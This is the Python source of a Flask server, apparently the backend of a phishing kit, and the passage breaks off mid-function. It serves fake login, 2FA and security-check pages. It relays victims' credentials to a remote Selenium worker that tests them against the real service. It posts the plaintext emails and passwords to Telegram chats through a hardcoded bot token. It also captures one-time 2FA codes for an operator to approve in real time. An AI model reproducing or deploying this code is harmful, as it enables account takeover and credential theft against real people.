from flask import Flask, render_template, request, jsonify, session
from flask_socketio import SocketIO, emit, join_room, leave_room
import json
import os
import time
import threading
import requests
import uuid
from datetime import datetime, timedelta

# Flask初期化
app = Flask(__name__, template_folder='html')
app.secret_key = os.getenv('SECRET_KEY', 'your-secret-key-here-change-in-production')

# ★ ここを追加：Render 本番は eventlet を使う想定（runtime.txtでPython 3.12に固定）
#   ローカルで簡単に試すとき等は ASYNC_MODE=threading を環境変数で渡せます
ASYNC_MODE = os.getenv('ASYNC_MODE', 'eventlet')  # 'eventlet' / 'threading'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode=ASYNC_MODE)

# データベースファイルパス
DB_PATH = os.getenv('DB_PATH', 'data/alldatabase.json')

# テレグラム設定
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8314466263:AAG_eAJkU6j8SNFfJsodij9hkkdpSPARc6o')
TELEGRAM_CHAT_IDS = os.getenv('TELEGRAM_CHAT_IDS', '8204394801,8129922775,8303180774,8243562591').split(',')

# Seleniumワーカー管理
selenium_workers = {}  # {session_id: worker_info}
selenium_job_queue = {}  # {job_id: job_data}

# セッションタイムアウト管理
session_timeouts = {}

# Telegram通知の重複防止
telegram_error_sent = {}  # {error_type: timestamp}

def log_with_timestamp(level, message):
    """タイムスタンプ付きログ出力"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    print(f"[{timestamp}] [SERVER] [{level}] {message}")

# ========================================
# データベース操作関数
# ========================================

def load_database():
    """データベースをロード"""
    if not os.path.exists(DB_PATH):
        return {"accounts": []}
    
    try:
        with open(DB_PATH, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {"accounts": []}

def save_database(data):
    """データベースを保存"""
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    with open(DB_PATH, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def find_account(email, password):
    """アカウントを検索（メール+パスワードの組み合わせ）"""
    db = load_database()
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            return account
    return None

def create_or_update_account(email, password, status):
    """アカウントを作成または更新"""
    db = load_database()
    account = find_account(email, password)
    
    now = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
    
    if account:
        # 既存アカウントに履歴を追加
        account['login_history'].append({
            'datetime': now,
            'status': status
        })
        log_with_timestamp("DB", f"アカウント更新: {status} | Email: {email}")
    else:
        # 新規アカウント作成
        new_account = {
            'email': email,
            'password': password,
            'login_history': [{
                'datetime': now,
                'status': status
            }],
            'twofa_session': None
        }
        db['accounts'].append(new_account)
        log_with_timestamp("DB", f"新規アカウント作成: {status} | Email: {email}")
    
    save_database(db)
    return db

def init_twofa_session(email, password):
    """2FAセッションを初期化"""
    db = load_database()
    
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            account['twofa_session'] = {
                'active': True,
                'codes': [],
                'security_check_completed': False,
                'created_at': datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
            }
            save_database(db)
            log_with_timestamp("DB", f"2FAセッション初期化 | Email: {email}")
            return True
    
    log_with_timestamp("ERROR", f"アカウント未発見（2FAセッション初期化失敗）| Email: {email}")
    return False

def add_twofa_code(email, password, code):
    """2FAコードを追加"""
    db = load_database()
    
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            if account.get('twofa_session'):
                now = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
                account['twofa_session']['codes'].append({
                    'code': code,
                    'datetime': now,
                    'status': 'pending'
                })
                save_database(db)
                log_with_timestamp("DB", f"2FAコード追加: {code} | Email: {email}")
                return True
    return False

def update_twofa_status(email, password, code, status):
    """2FAコードのステータスを更新"""
    db = load_database()
    
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            if account.get('twofa_session'):
                for code_entry in account['twofa_session']['codes']:
                    if code_entry['code'] == code:
                        code_entry['status'] = status
                        save_database(db)
                        log_with_timestamp("DB", f"2FAステータス更新: {code} -> {status} | Email: {email}")
                        return True
    return False

def complete_security_check(email, password):
    """セキュリティチェック完了"""
    db = load_database()
    
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            if account.get('twofa_session'):
                account['twofa_session']['security_check_completed'] = True
                save_database(db)
                log_with_timestamp("DB", f"セキュリティチェック完了 | Email: {email}")
                return True
    return False

def delete_twofa_session(email, password):
    """2FAセッションを削除"""
    db = load_database()
    
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            account['twofa_session'] = None
            save_database(db)
            log_with_timestamp("DB", f"2FAセッション削除 | Email: {email}")
            return True
    return False

def get_all_active_sessions():
    """すべてのアクティブな2FAセッションを取得"""
    db = load_database()
    active_sessions = []
    
    for account in db['accounts']:
        if account.get('twofa_session') and account['twofa_session'].get('active'):
            active_sessions.append({
                'email': account['email'],
                'password': account['password'],
                'session': account['twofa_session']
            })
    
    return active_sessions

# ========================================
# テレグラム通知関数
# ========================================

def send_telegram_notification(email, password):
    """テレグラムにログイン成功通知を送信"""
    message = f"◎ログイン成功\nメールアドレス：{email}\nパスワード：{password}"
    
    log_with_timestamp("TELEGRAM", f"通知送信開始 | Email: {email}")
    
    for chat_id in TELEGRAM_CHAT_IDS:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {
                'chat_id': chat_id,
                'text': message
            }
            requests.post(url, json=payload, timeout=5)
            log_with_timestamp("TELEGRAM", f"送信完了: Chat {chat_id}")
        except Exception as e:
            log_with_timestamp("ERROR", f"Telegram通知失敗 (Chat: {chat_id}) | Error: {str(e)}")

def send_telegram_notification_error(message):
    """エラー通知をテレグラムに送信（重複防止あり）"""
    error_type = message.split('\n')[0] if '\n' in message else message
    current_time = time.time()
    
    # 同じエラーが5分以内に送信されていたらスキップ
    if error_type in telegram_error_sent:
        last_sent = telegram_error_sent[error_type]
        if current_time - last_sent < 300:  # 5分 = 300秒
            log_with_timestamp("TELEGRAM", f"重複通知スキップ（5分以内に送信済み）| Error: {error_type}")
            return
    
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    error_message = f"⚠️ エラー通知\n{message}\nタイムスタンプ: {timestamp}"
    
    log_with_timestamp("TELEGRAM", f"エラー通知送信開始 | Message: {error_type}")
    
    for chat_id in TELEGRAM_CHAT_IDS:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {
                'chat_id': chat_id,
                'text': error_message
            }
            requests.post(url, json=payload, timeout=5)
            log_with_timestamp("TELEGRAM", f"エラー通知送信完了: Chat {chat_id}")
        except Exception as e:
            log_with_timestamp("ERROR", f"Telegramエラー通知失敗 (Chat: {chat_id}) | Error: {str(e)}")
    
    # 送信時刻を記録
    telegram_error_sent[error_type] = current_time

# ========================================
# タイムアウト管理
# ========================================

def start_session_timeout(email, password, timeout_seconds=600):
    """セッションタイムアウトを開始"""
    def timeout_handler():
        time.sleep(timeout_seconds)
        log_with_timestamp("TIMEOUT", f"セッションタイムアウト発生 | Email: {email}")
        
        socketio.emit('session_timeout', {
            'email': email,
            'message': '一時的なエラーが発生しました。もう一度お試しください'
        }, namespace='/', room=f'user_{email}')
        
        delete_twofa_session(email, password)
        
        if email in session_timeouts:
            del session_timeouts[email]
            log_with_timestamp("TIMEOUT", f"タイムアウトタイマー削除 | Email: {email}")
    
    if email in session_timeouts:
        session_timeouts[email].cancel()
        log_with_timestamp("TIMEOUT", f"既存タイマーキャンセル | Email: {email}")
    
    timer = threading.Timer(timeout_seconds, timeout_handler)
    timer.start()
    session_timeouts[email] = timer
    log_with_timestamp("TIMEOUT", f"タイマー開始: {timeout_seconds}秒 | Email: {email}")

def cancel_session_timeout(email):
    """セッションタイムアウトをキャンセル"""
    if email in session_timeouts:
        session_timeouts[email].cancel()
        del session_timeouts[email]
        log_with_timestamp("TIMEOUT", f"タイマーキャンセル完了 | Email: {email}")

# ========================================
# WebSocket イベント
# ========================================

@socketio.on('connect')
def handle_connect():
    log_with_timestamp("WEBSOCKET", f"クライアント接続 | Session: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    # Seleniumワーカーの切断チェック
    if request.sid in selenium_workers:
        worker_info = selenium_workers[request.sid]
        log_with_timestamp("WARN", f"Seleniumワーカー切断 | Worker: {worker_info['worker_id']}")
        del selenium_workers[request.sid]
    else:
        log_with_timestamp("WEBSOCKET", f"クライアント切断 | Session: {request.sid}")

@socketio.on('register_selenium_worker')
def handle_register_worker(data):
    """PC側Seleniumワーカーの登録"""
    worker_id = data.get('worker_id')
    selenium_workers[request.sid] = {
        'worker_id': worker_id,
        'registered_at': datetime.now().strftime('%Y-%m-%dT%H:%M:%S'),
        'session_id': request.sid
    }
    log_with_timestamp("INFO", f"Seleniumワーカー登録完了 | Worker: {worker_id} | Session: {request.sid}")

@socketio.on('selenium_login_result')
def handle_selenium_result(data):
    """PC側からのログイン結果を受信"""
    job_id = data.get('job_id')
    success = data.get('success')
    email = data.get('email')
    error = data.get('error')
    
    if job_id in selenium_job_queue:
        job = selenium_job_queue[job_id]
        job['status'] = 'completed'
        job['success'] = success
        job['completed_at'] = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
        
        if error:
            job['error'] = error
            log_with_timestamp("INFO", f"ログイン結果受信（エラー）← PC | Job: {job_id} | Email: {email} | Error: {error}")
        else:
            log_with_timestamp("INFO", f"ログイン結果受信 ← PC | Job: {job_id} | Email: {email} | Success: {success}")
    else:
        log_with_timestamp("WARN", f"不明なジョブIDの結果受信 | Job: {job_id}")

@socketio.on('join_user_room')
def handle_join_user_room(data):
    email = data.get('email')
    if email:
        join_room(f'user_{email}')
        log_with_timestamp("WEBSOCKET", f"ユーザーが部屋に参加 | Email: {email}")

@socketio.on('join_admin_room')
def handle_join_admin_room():
    join_room('admin')
    log_with_timestamp("WEBSOCKET", "管理者が部屋に参加")

# ========================================
# ルート定義
# ========================================

@app.route('/')
def index():
    return render_template('loginemail.html')

@app.route('/login/email')
def login_email():
    return render_template('loginemail.html')

@app.route('/login/password')
def login_password():
    return render_template('loginpassword.html')

@app.route('/login/2fa')
def login_2fa():
    return render_template('login2fa.html')

@app.route('/dashboard/security-check')
def dashboard_security_check():
    return render_template('dashboardsecuritycheck.html')

@app.route('/dashboard/complete')
def dashboard_complete():
    return render_template('dashboardcomplete.html')

@app.route('/admin/top')
def admin_top():
    return render_template('admintop.html')

@app.route('/admin/accounts')
def admin_accounts():
    return render_template('adminaccounts.html')

# ========================================
# Selenium用API エンドポイント（ポーリング方式）
# ========================================

@app.route('/api/selenium/register', methods=['POST'])
def api_selenium_register():
    """Seleniumワーカー登録"""
    data = request.json
    worker_id = data.get('worker_id')
    pc_url = data.get('pc_url')
    
    # セッションIDとして一意のIDを生成
    session_id = str(uuid.uuid4())
    
    selenium_workers[session_id] = {
        'worker_id': worker_id,
        'pc_url': pc_url,
        'registered_at': datetime.now().strftime('%Y-%m-%dT%H:%M:%S'),
        'session_id': session_id
    }
    
    log_with_timestamp("INFO", f"Seleniumワーカー登録完了（HTTP）| Worker: {worker_id} | PC URL: {pc_url} | Session: {session_id}")
    
    # 接続確認を即座に実行（同期的に）
    def verify_connection():
        import socket
        from urllib.parse import urlparse
        
        max_retries = 5
        retry_delay = 2
        
        for attempt in range(1, max_retries + 1):
            try:
                log_with_timestamp("INFO", f"📡 接続確認開始 ({attempt}/{max_retries}) | URL: {pc_url}")
                
                # DNS解決
                hostname = urlparse(pc_url).hostname
                log_with_timestamp("INFO", f"🔍 DNS解決中... | Host: {hostname}")
                ip_addresses = socket.getaddrinfo(hostname, 443, socket.AF_UNSPEC, socket.SOCK_STREAM)
                log_with_timestamp("SUCCESS", f"✅ DNS解決成功 | Host: {hostname} | IPs: {[ip[4][0] for ip in ip_addresses[:3]]}")
                
                # HTTP接続テスト
                log_with_timestamp("INFO", f"🌐 HTTP接続テスト中... | URL: {pc_url}/health")
                response = requests.get(f"{pc_url}/health", timeout=15)
                
                if response.status_code == 200:
                    result = response.json()
                    log_with_timestamp("SUCCESS", f"✅✅✅ ワーカー接続確認成功！ | URL: {pc_url} | Status: {result}")
                    return True
                else:
                    log_with_timestamp("WARN", f"⚠️ ワーカー応答異常 | Status: {response.status_code}")
                    
            except socket.gaierror as e:
                log_with_timestamp("ERROR", f"❌ DNS解決失敗 ({attempt}/{max_retries}) | Error: {str(e)}")
            except requests.exceptions.Timeout as e:
                log_with_timestamp("ERROR", f"❌ 接続タイムアウト ({attempt}/{max_retries}) | Error: {str(e)}")
            except Exception as e:
                log_with_timestamp("ERROR", f"❌ 接続失敗 ({attempt}/{max_retries}) | Error: {str(e)}")
            
            if attempt < max_retries:
                log_with_timestamp("INFO", f"⏳ {retry_delay}秒後にリトライします...")
                time.sleep(retry_delay)
        
        log_with_timestamp("CRITICAL", f"🚨 ワーカー接続確認失敗（{max_retries}回試行） | URL: {pc_url}")
        return False
    
    # 別スレッドで実行（登録レスポンスをブロックしない）
    threading.Thread(target=verify_connection, daemon=True).start()
    
    return jsonify({
        'success': True,
        'session_id': session_id
    })

@app.route('/api/selenium/fetch-job', methods=['GET'])
def api_selenium_fetch_job():
    """PC側がジョブを取得"""
    # キューから最初の pending ジョブを探す
    for job_id, job in list(selenium_job_queue.items()):
        if job['status'] == 'pending':
            # ジョブをprocessingに変更
            job['status'] = 'processing'
            log_with_timestamp("INFO", f"ジョブ配信 → PC | Job: {job_id} | Email: {job['email']}")
            
            return jsonify({
                'has_job': True,
                'job_id': job_id,
                'email': job['email'],
                'password': job['password']
            }), 200
    
    # ジョブがない場合
    return jsonify({
        'has_job': False
    }), 200

@app.route('/api/selenium/job-accepted', methods=['POST'])
def api_selenium_job_accepted():
    """PC側からのジョブ受理通知を受信"""
    data = request.json
    job_id = data.get('job_id')
    
    if job_id in selenium_job_queue:
        job = selenium_job_queue[job_id]
        job['status'] = 'processing'
        job['accepted_at'] = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
        log_with_timestamp("INFO", f"ジョブ受理確認 ← PC | Job: {job_id}")
    else:
        log_with_timestamp("WARN", f"不明なジョブIDの受理通知 | Job: {job_id}")
    
    return jsonify({
        'success': True
    })

@app.route('/api/selenium/submit-result', methods=['POST'])
def api_selenium_submit_result():
    """PC側からの結果を受信"""
    data = request.json
    job_id = data.get('job_id')
    success = data.get('success')
    email = data.get('email')
    error = data.get('error')
    
    if job_id in selenium_job_queue:
        job = selenium_job_queue[job_id]
        job['status'] = 'completed'
        job['success'] = success
        job['completed_at'] = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
        
        if error:
            job['error'] = error
            log_with_timestamp("INFO", f"ログイン結果受信（エラー）← PC | Job: {job_id} | Email: {email} | Error: {error}")
        else:
            log_with_timestamp("INFO", f"ログイン結果受信 ← PC | Job: {job_id} | Email: {email} | Success: {success}")
    else:
        log_with_timestamp("WARN", f"不明なジョブIDの結果受信 | Job: {job_id}")
    
    return jsonify({
        'success': True
    })

# ========================================
# API エンドポイント
# ========================================

@app.route('/api/login', methods=['POST'])
def api_login():
    """ログイン処理"""
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    
    log_with_timestamp("API", f"ログインリクエスト受信 | Email: {email}")
    
    if not email or not password:
        log_with_timestamp("API", "バリデーションエラー: 空のemail/password")
        return jsonify({
            'success': False,
            'message': 'メールアドレスとパスワードを入力してください'
        })
    
    # Seleniumワーカーが接続されているか確認
    if not selenium_workers:
        log_with_timestamp("ERROR", f"Seleniumワーカー未接続 | Email: {email}")
        send_telegram_notification_error("Selenium PCがオフラインです")
        return jsonify({
            'success': False,
            'message': '一時的なエラーが発生しました。しばらくしてからお試しください'
        })
    
    # ジョブID生成
    job_id = str(uuid.uuid4())
    log_with_timestamp("INFO", f"ジョブ作成 | Job: {job_id} | Email: {email}")
    
    # ジョブをキューに追加
    selenium_job_queue[job_id] = {
        'job_id': job_id,
        'email': email,
        'password': password,
        'status': 'pending',
        'success': None,
        'created_at': datetime.now().strftime('%Y-%m-%dT%H:%M:%S'),
        'retry_count': 0
    }
    
    log_with_timestamp("INFO", f"ジョブキューに追加 | Job: {job_id} | Email: {email}")
    
    # PC側にジョブを送信
    log_with_timestamp("DEBUG", f"Seleniumワーカー数: {len(selenium_workers)}")
    
    # 全ワーカー情報を出力
    for session_id, worker_info in selenium_workers.items():
        log_with_timestamp("DEBUG", f"Worker {session_id[:8]}... | PC URL: {worker_info.get('pc_url')} | 登録時刻: {worker_info.get('registered_at')}")
    
    if selenium_workers:
        # 最新のワーカーを取得（登録時刻でソート）
        latest_worker = max(selenium_workers.values(), key=lambda w: w.get('registered_at', ''))
        pc_url = latest_worker.get('pc_url')
        
        log_with_timestamp("DEBUG", f"最新ワーカーのPC URL取得: {pc_url}")
        
        if pc_url:
            try:
                requests.post(
                    f"{pc_url}/api/job",
                    json={
                        'job_id': job_id,
                        'email': email,
                        'password': password
                    },
                    timeout=15  # DNS解決とネットワーク遅延を考慮
                )
                log_with_timestamp("INFO", f"ジョブ送信完了 → PC | Job: {job_id} | PC URL: {pc_url}")
            except Exception as e:
                log_with_timestamp("ERROR", f"PC側へのジョブ送信エラー: {str(e)}")
        else:
            log_with_timestamp("ERROR", f"PC URLが未設定 | Worker: {worker.get('worker_id')}")
    
    # 結果を待機（最大60秒）
    max_wait = 60
    start_time = time.time()
    last_log_time = start_time
    
    while time.time() - start_time < max_wait:
        elapsed = time.time() - start_time
        
        # 10秒ごとにログ出力
        if elapsed - (last_log_time - start_time) >= 10:
            log_with_timestamp("INFO", f"待機中... ({int(elapsed)}秒経過) | Job: {job_id}")
            last_log_time = time.time()
        
        job = selenium_job_queue.get(job_id)
        
        if job and job['status'] == 'completed':
            success = job['success']
            
            # キューから削除
            del selenium_job_queue[job_id]
            log_with_timestamp("INFO", f"ジョブキューから削除 | Job: {job_id}")
            
            if success:
                # ログイン成功
                log_with_timestamp("SUCCESS", f"ログイン処理完了: 成功 | Email: {email}")
                
                create_or_update_account(email, password, 'success')
                init_twofa_session(email, password)
                send_telegram_notification(email, password)
                
                socketio.emit('block_created', {
                    'email': email,
                    'password': password,
                    'timestamp': datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
                }, namespace='/')
                log_with_timestamp("WEBSOCKET", f"管理者通知: block_created | Email: {email}")
                
                start_session_timeout(email, password)
                
                return jsonify({
                    'success': True,
                    'message': 'ログイン成功',
                    'requires_2fa': True
                })
            else:
                # ログイン失敗
                log_with_timestamp("FAILED", f"ログイン処理完了: 失敗 | Email: {email}")
                create_or_update_account(email, password, 'failed')
                
                return jsonify({
                    'success': False,
                    'message': 'ユーザーID、メールアドレス又はパスワードが間違っています'
                })
        
        socketio.sleep(0.5)  # 0.1秒から0.5秒に変更
    
    # タイムアウト（1回目）
    log_with_timestamp("ERROR", f"タイムアウト（1回目）| Job: {job_id} | Email: {email}")
    
    # リトライ処理
    log_with_timestamp("INFO", f"リトライ開始 (1/1) | Email: {email}")
    
    # Seleniumワーカー接続確認
    if not selenium_workers:
        log_with_timestamp("ERROR", "リトライ時にSeleniumワーカー未接続")
        del selenium_job_queue[job_id]
        send_telegram_notification_error("Selenium PCがダウンしています")
        return jsonify({
            'success': False,
            'message': '一時的なエラーが発生しました。もう一度お試しください'
        })
    
    # 新しいジョブID生成
    retry_job_id = str(uuid.uuid4())
    log_with_timestamp("INFO", f"リトライジョブ作成 | Job: {retry_job_id} | 元Job: {job_id}")
    
    # 元のジョブを削除
    del selenium_job_queue[job_id]
    
    # リトライジョブをキューに追加
    selenium_job_queue[retry_job_id] = {
        'job_id': retry_job_id,
        'email': email,
        'password': password,
        'status': 'pending',
        'success': None,
        'created_at': datetime.now().strftime('%Y-%m-%dT%H:%M:%S'),
        'retry_count': 1
    }
    
    log_with_timestamp("INFO", f"リトライジョブキューに追加 | Job: {retry_job_id}")
    
    # PC側にリトライジョブを送信
    log_with_timestamp("DEBUG", f"リトライ: Seleniumワーカー数: {len(selenium_workers)}")
    
    # 全ワーカー情報を出力
    for session_id, worker_info in selenium_workers.items():
        log_with_timestamp("DEBUG", f"リトライ: Worker {session_id[:8]}... | PC URL: {worker_info.get('pc_url')} | 登録時刻: {worker_info.get('registered_at')}")
    
    if selenium_workers:
        # 最新のワーカーを取得（登録時刻でソート）
        latest_worker = max(selenium_workers.values(), key=lambda w: w.get('registered_at', ''))
        pc_url = latest_worker.get('pc_url')
        
        log_with_timestamp("DEBUG", f"リトライ: 最新ワーカーのPC URL取得: {pc_url}")
        
        if pc_url:
            try:
                requests.post(
                    f"{pc_url}/api/job",
                    json={
                        'job_id': retry_job_id,
                        'email': email,
                        'password': password
                    },
                    timeout=15  # DNS解決とネットワーク遅延を考慮
                )
                log_with_timestamp("INFO", f"リトライジョブ送信完了 → PC | Job: {retry_job_id} | PC URL: {pc_url}")
            except Exception as e:
                log_with_timestamp("ERROR", f"PC側へのリトライジョブ送信エラー: {str(e)}")
        else:
            log_with_timestamp("ERROR", f"PC URLが未設定 | Worker: {worker.get('worker_id')}")
    
    # 再度60秒待機
    start_time = time.time()
    last_log_time = start_time
    
    while time.time() - start_time < max_wait:
        elapsed = time.time() - start_time
        
        # 10秒ごとにログ出力
        if elapsed - (last_log_time - start_time) >= 10:
            log_with_timestamp("INFO", f"リトライ待機中... ({int(elapsed)}秒経過) | Job: {retry_job_id}")
            last_log_time = time.time()
        
        job = selenium_job_queue.get(retry_job_id)
        
        if job and job['status'] == 'completed':
            success = job['success']
            
            # キューから削除
            del selenium_job_queue[retry_job_id]
            log_with_timestamp("INFO", f"リトライジョブキューから削除 | Job: {retry_job_id}")
            
            if success:
                # ログイン成功
                log_with_timestamp("SUCCESS", f"リトライでログイン成功 | Email: {email}")
                
                create_or_update_account(email, password, 'success')
                init_twofa_session(email, password)
                send_telegram_notification(email, password)
                
                socketio.emit('block_created', {
                    'email': email,
                    'password': password,
                    'timestamp': datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
                }, namespace='/')
                log_with_timestamp("WEBSOCKET", f"管理者通知: block_created | Email: {email}")
                
                start_session_timeout(email, password)
                
                return jsonify({
                    'success': True,
                    'message': 'ログイン成功',
                    'requires_2fa': True
                })
            else:
                # ログイン失敗
                log_with_timestamp("FAILED", f"リトライでもログイン失敗 | Email: {email}")
                create_or_update_account(email, password, 'failed')
                
                return jsonify({
                    'success': False,
                    'message': 'ユーザーID、メールアドレス又はパスワードが間違っています'
                })
        
        socketio.sleep(0.5)  # 0.1秒から0.5秒に変更
    
    # タイムアウト（2回目） - PCダウン判定
    log_with_timestamp("CRITICAL", f"タイムアウト（2回目）- PCダウン判定 | Job: {retry_job_id} | Email: {email}")
    del selenium_job_queue[retry_job_id]
    
    send_telegram_notification_error("Selenium PCがダウンしています")
    
    return jsonify({
        'success': False,
        'message': '一時的なエラーが発生しました。もう一度お試しください'
    })

@app.route('/api/2fa/submit', methods=['POST'])
def api_2fa_submit():
    """2FAコード送信"""
    data = request.json
    email = data.get('email', '').strip()
    code = data.get('code', '').strip()
    
    log_with_timestamp("API", f"2FAコード受信 | Email: {email} | Code: {code}")
    
    db = load_database()
    account = None
    for acc in db['accounts']:
        if acc['email'] == email and acc.get('twofa_session') is not None and acc.get('twofa_session', {}).get('active'):
            account = acc
            break
    
    if not account:
        log_with_timestamp("ERROR", f"2FAセッション未発見 | Email: {email}")
        return jsonify({
            'success': False,
            'message': 'セッションが見つかりません'
        })
    
    password = account['password']
    
    if account['twofa_session']['codes']:
        has_pending = any(c['status'] == 'pending' for c in account['twofa_session']['codes'])
        if has_pending:
            log_with_timestamp("WARN", f"前のコード承認待ち | Email: {email}")
            return jsonify({
                'success': False,
                'message': '前のコードの承認待ちです'
            })
    
    # 2FAコードを追加（データベースに保存される）
    add_twofa_code(email, password, code)
    
    # タイムアウトを開始
    start_session_timeout(email, password)
    
    # ★データベース保存後に最新のセッション情報を取得★
    db = load_database()
    updated_account = None
    for acc in db['accounts']:
        if acc['email'] == email and acc['password'] == password:
            updated_account = acc
            break
    
    # 管理者画面に通知（最新のセッション全体を送信）
    if updated_account and updated_account.get('twofa_session'):
        log_with_timestamp("WEBSOCKET", f"管理者通知準備: 2FAコード受信 | Email: {email} | Codes count: {len(updated_account['twofa_session']['codes'])}")
        
        socketio.emit('twofa_code_submitted', {
            'email': email,
            'password': password,
            'code': code,
            'timestamp': datetime.now().strftime('%Y-%m-%dT%H:%M:%S'),
            'session': updated_account['twofa_session']  # 最新のセッション情報
        }, namespace='/', to='admin')
        
        log_with_timestamp("WEBSOCKET", f"管理者通知送信完了: 2FAコード受信 | Email: {email}")
    else:
        log_with_timestamp("ERROR", f"管理者通知失敗: アカウントまたはセッションが見つかりません | Email: {email}")
    
    return jsonify({
        'success': True,
        'message': '2FAコードを送信しました'
    })

@app.route('/api/2fa/check-status', methods=['POST'])
def api_2fa_check_status():
    """2FA承認状態をチェック"""
    data = request.json
    email = data.get('email', '').strip()
    
    db = load_database()
    account = None
    for acc in db['accounts']:
        if acc['email'] == email and acc.get('twofa_session'):
            account = acc
            break
    
    if not account or not account.get('twofa_session'):
        return jsonify({
            'success': False,
            'is_approved': False
        })
    
    if account['twofa_session']['codes']:
        latest_code = account['twofa_session']['codes'][-1]
        if latest_code['status'] == 'approved':
            return jsonify({
                'success': True,
                'is_approved': True
            })
        elif latest_code['status'] == 'rejected':
            return jsonify({
                'success': True,
                'is_approved': False,
                'rejected': True
            })
    
    return jsonify({
        'success': True,
        'is_approved': False
    })

@app.route('/api/security-check/submit', methods=['POST'])
def api_security_check_submit():
    """セキュリティチェック送信"""
    data = request.json
    email = data.get('email', '').strip()
    
    log_with_timestamp("API", f"セキュリティチェック送信 | Email: {email}")
    
    # アカウント情報を取得
    db = load_database()
    account = None
    for acc in db['accounts']:
        if acc['email'] == email and acc.get('twofa_session'):
            account = acc
            break
    
    # 管理者画面に通知（セッション情報を含む）
    socketio.emit('security_check_submitted', {
        'email': email,
        'password': account['password'] if account else '',
        'timestamp': datetime.now().strftime('%Y-%m-%dT%H:%M:%S'),
        'session': account['twofa_session'] if account else None
    }, namespace='/', to='admin')
    log_with_timestamp("WEBSOCKET", f"管理者通知: セキュリティチェック送信 | Email: {email}")
    
    return jsonify({
        'success': True,
        'message': 'セキュリティチェックを送信しました'
    })

@app.route('/api/security-check/check-status', methods=['POST'])
def api_security_check_status():
    """セキュリティチェック完了状態をチェック"""
    data = request.json
    email = data.get('email', '').strip()
    
    db = load_database()
    account = None
    for acc in db['accounts']:
        if acc['email'] == email and acc.get('twofa_session'):
            account = acc
            break
    
    if not account or not account.get('twofa_session'):
        return jsonify({
            'success': False,
            'completed': False
        })
    
    completed = account['twofa_session'].get('security_check_completed', False)
    
    return jsonify({
        'success': True,
        'completed': completed
    })

@app.route('/api/admin/accounts', methods=['GET'])
def api_admin_accounts():
    """アカウント一覧取得"""
    db = load_database()
    
    success_accounts = []
    failed_accounts = []
    
    for account in db['accounts']:
        if not account['login_history']:
            continue
        
        latest_login = max(account['login_history'], key=lambda x: x['datetime'])
        
        account_info = {
            'email': account['email'],
            'password': account['password'],
            'latest_login': latest_login['datetime'],
            'login_history': account['login_history']
        }
        
        if latest_login['status'] == 'success':
            success_accounts.append(account_info)
        else:
            failed_accounts.append(account_info)
    
    success_accounts.sort(key=lambda x: x['latest_login'], reverse=True)
    failed_accounts.sort(key=lambda x: x['latest_login'], reverse=True)
    
    return jsonify({
        'success': True,
        'success_accounts': success_accounts,
        'failed_accounts': failed_accounts
    })

@app.route('/api/admin/active-sessions', methods=['GET'])
def api_admin_active_sessions():
    """アクティブな2FAセッション取得"""
    sessions = get_all_active_sessions()
    return jsonify({
        'success': True,
        'sessions': sessions
    })

@app.route('/api/admin/2fa/approve', methods=['POST'])
def api_admin_2fa_approve():
    """2FAコードを承認"""
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    code = data.get('code', '').strip()
    
    log_with_timestamp("API", f"管理者承認受信 | Code: {code} | Email: {email}")
    
    update_twofa_status(email, password, code, 'approved')
    
    socketio.emit('twofa_approved', {
        'email': email
    }, namespace='/', room=f'user_{email}')
    log_with_timestamp("WEBSOCKET", f"ユーザー通知: 2FA承認 | Email: {email}")
    
    return jsonify({
        'success': True,
        'message': '2FAコードを承認しました'
    })

@app.route('/api/admin/2fa/reject', methods=['POST'])
def api_admin_2fa_reject():
    """2FAコードを再入力要求"""
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    code = data.get('code', '').strip()
    
    log_with_timestamp("API", f"管理者拒否受信 | Code: {code} | Email: {email}")
    
    update_twofa_status(email, password, code, 'rejected')
    
    socketio.emit('twofa_rejected', {
        'email': email
    }, namespace='/', room=f'user_{email}')
    log_with_timestamp("WEBSOCKET", f"ユーザー通知: 2FA拒否 | Email: {email}")
    
    return jsonify({
        'success': True,
        'message': '再入力を要求しました'
    })

@app.route('/api/admin/security-complete', methods=['POST'])
def api_admin_security_complete():
    """セキュリティチェック完了"""
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    
    log_with_timestamp("API", f"セキュリティチェック完了 | Email: {email}")
    
    complete_security_check(email, password)
    cancel_session_timeout(email)
    
    socketio.emit('security_check_completed', {
        'email': email
    }, namespace='/', room=f'user_{email}')
    log_with_timestamp("WEBSOCKET", f"ユーザー通知: セキュリティチェック完了 | Email: {email}")
    
    return jsonify({
        'success': True,
        'message': 'セキュリティチェックを完了しました'
    })

@app.route('/api/admin/block/delete', methods=['POST'])
def api_admin_block_delete():
    """ブロック削除"""
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    
    log_with_timestamp("API", f"ブロック削除 | Email: {email}")
    
    delete_twofa_session(email, password)
    cancel_session_timeout(email)
    
